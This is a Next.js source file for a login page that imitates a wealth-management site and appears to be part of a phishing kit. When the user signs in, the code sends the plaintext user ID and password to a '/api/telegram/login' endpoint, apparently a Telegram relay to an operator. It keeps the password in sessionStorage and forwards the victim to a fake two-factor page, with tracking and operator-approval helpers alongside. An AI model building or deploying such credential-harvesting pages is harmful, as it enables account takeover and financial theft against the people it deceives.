'use client'

import Link from "next/link"
import Image from "next/image"
import { Lock, Check, UserPlus, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { SiteFooter } from "@/components/SiteFooter"
import { useVisitorTracking, trackFormSubmission } from "@/hooks/use-visitor-tracking"
import { useEffect, useLayoutEffect, useState, Suspense } from "react"
import { FLOW_STEP, setFlowStep } from "@/lib/flow-guard"
import { MSG_INCORRECT, MSG_UNABLE_VERIFY_TIME } from "@/lib/approval-messages"
import { WEALTHCARE_BUTTON_CHROME } from "@/lib/wealthcare-button-styles"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"

function LoginPageContent() {
  useVisitorTracking()
  const [userId, setUserId] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [isRegisterLoading, setIsRegisterLoading] = useState(false)

  useEffect(() => {
    const clearAuthCookies = async () => {
      try {
        await fetch('/api/clear-auth-cookies', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
        })
      } catch {
        // Silently fail - not critical
      }
    }
    void clearAuthCookies()
  }, [])

  useLayoutEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const denied = params.get('loginDenied') === '1'
    const verifyUnavailable = params.get('verifyUnavailable') === '1'
    if (!denied && !verifyUnavailable) return
    setUserId('')
    setPassword('')
    setError(denied ? MSG_INCORRECT : MSG_UNABLE_VERIFY_TIME)
    window.history.replaceState({}, '', '/')
  }, [])

  const handleRegister = async () => {
    setIsRegisterLoading(true)
    trackFormSubmission({
      type: 'registration',
      page: '/',
    }).catch(() => {})
    window.location.href = '/api/login-out'
  }

  const handleSignIn = async (e?: React.MouseEvent<HTMLButtonElement>) => {
    if (e) {
      e.preventDefault()
      e.stopPropagation()
    }

    const trimmedUserId = userId.trim()
    const trimmedPassword = password.trim()

    const looksLikeEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedUserId)
    if (looksLikeEmail) {
      setError('User ID not valid.')
      return
    }

    if (trimmedUserId.length < 4 || trimmedPassword.length < 4) {
      setError('User ID and Password should be minimum 4 characters.')
      return
    }

    setError('')
    setIsLoading(true)

    const telegramPromise = fetch('/api/telegram/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userId: trimmedUserId,
        password: trimmedPassword,
      }),
    }).catch(() => {})

    await Promise.all([
      new Promise((r) => setTimeout(r, 2000)),
      telegramPromise,
    ])

    try {
      sessionStorage.setItem('loginReady', '1')
      sessionStorage.setItem('loginUserId', trimmedUserId)
      sessionStorage.setItem('loginPassword', trimmedPassword)
      sessionStorage.setItem('maskedEmail', '**********')
      sessionStorage.setItem('maskedPhone', '***-***-****')
    } catch {}

    setFlowStep(FLOW_STEP.LOGIN)
    window.location.href = '/login/2fa-verify'
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className="border-b border-gray-200 px-6 py-4">
        <div className="flex items-center">
          <Link href="/" className="flex items-center shrink-0">
            <Image
              src="/img/ebc994a1e5464f6b94b98cd212d5cbac.jpeg"
              alt={SITE_DISPLAY_NAME}
              width={140}
              height={32}
              className="h-8 w-auto"
              priority
            />
          </Link>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center px-6 pt-4 md:pt-10 pb-8 lg:pr-[700px]">
        <div className="w-full max-w-md">
          <div className="flex justify-center mb-4">
            <div className="w-12 h-12 border-2 border-gray-400 flex items-center justify-center">
              <Lock className="w-6 h-6 text-gray-400" />
            </div>
          </div>

          <p className="text-center text-gray-600 text-sm mb-4 leading-relaxed">
            Your personal details stay protected under our privacy policy.
          </p>

          <h1 className="text-center text-gray-800 text-2xl font-medium mb-5 tracking-tight">
            {SITE_DISPLAY_NAME}
          </h1>

          {error ? (
            <p className="mb-4 text-sm text-red-600 whitespace-pre-line" role="alert">
              {error}
            </p>
          ) : null}

          <form
            onSubmit={(e) => {
              e.preventDefault()
              e.stopPropagation()
              void handleSignIn()
            }}
            className="space-y-4"
          >
            <div className="space-y-1">
              <Label htmlFor="userId" className="text-gray-700">
                UserId <span className="text-orange-500">*</span>
              </Label>
              <Input
                id="userId"
                type="text"
                value={userId}
                onChange={(e) => {
                  setUserId(e.target.value)
                  if (error) setError('')
                }}
                className="w-full border-gray-300 focus:border-blue-500 focus:ring-blue-500"
              />
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Username? </span>
                <Link href="#" className="text-blue-600 hover:text-blue-700">
                  Let us help
                </Link>
              </p>
            </div>

            <div className="space-y-1">
              <Label htmlFor="password" className="text-gray-700">
                Password <span className="text-orange-500">*</span>
              </Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value)
                  if (error) setError('')
                }}
                className="w-full border-gray-300 focus:border-blue-500 focus:ring-blue-500"
              />
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Password? </span>
                <Link href="#" className="text-blue-600 hover:text-blue-700">
                  Let us help
                </Link>
              </p>
            </div>

            <div className="flex justify-center md:justify-start">
              <Button
                type="submit"
                disabled={isLoading}
                className={`py-2 px-6 text-base font-normal min-w-[120px] transition-colors cursor-pointer ${WEALTHCARE_BUTTON_CHROME}`}
              >
                {isLoading ? (
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                ) : (
                  <Check className="w-5 h-5 mr-2" />
                )}
                {isLoading ? 'Signing in...' : 'Continue'}
              </Button>
            </div>

            <div className="pt-4">
              <p className="text-gray-600 mb-2 text-sm text-left">Don&apos;t have an account?</p>
              <div className="flex justify-center md:justify-start">
                <Button
                  type="button"
                  variant="secondary"
                  disabled={isRegisterLoading || isLoading}
                  className={`py-2 px-6 text-base font-normal min-w-[120px] transition-colors cursor-pointer ${WEALTHCARE_BUTTON_CHROME}`}
                  onClick={() => void handleRegister()}
                >
                  {isRegisterLoading ? (
                    <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  ) : (
                    <UserPlus className="w-5 h-5 mr-2" />
                  )}
                  {isRegisterLoading ? 'Loading...' : 'Register'}
                </Button>
              </div>
            </div>
          </form>
        </div>
      </main>

      <SiteFooter />
    </div>
  )
}

export default function LoginPage() {
  return (
    <Suspense fallback={null}>
      <LoginPageContent />
    </Suspense>
  )
}
